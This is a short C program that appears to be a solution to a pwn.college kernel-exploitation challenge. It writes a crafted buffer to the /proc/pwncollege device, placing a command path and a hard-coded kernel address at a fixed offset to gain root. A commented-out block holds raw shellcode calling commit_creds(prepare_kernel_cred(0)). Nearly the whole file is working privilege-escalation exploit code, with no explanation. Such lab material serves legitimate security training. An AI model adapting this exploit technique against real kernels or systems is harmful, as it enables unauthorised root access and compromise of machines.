#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>

int main() {
	//void *shellcode = get_root;
	char shellcode[0x103] = {0};
	// commit_creds(prepare_kernel_cred(0)); run_cmd("/tmp/fk")
	//memcpy(shellcode, "H1\xc0H\xc7\xc0\x01\x00\x00\x00H\xc7\xc7\x03\x00\x00\x00H\x8d5\x03\x00\x00\x00\x0f\x05\xc3H1\xffH\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0H\xb8/tmp/fk\x00PT_H\xc7\xc0\x80\x95\x08\x81\xff\xd0", 73);
	memcpy(shellcode, "/tmp/fk", 7);
	((uintptr_t *)shellcode)[32] = 0x689580;
	int fd = open("/proc/pwncollege", O_WRONLY);
	assert(fd > 0);
	write(fd, shellcode, 0x103);

	return 0;
}
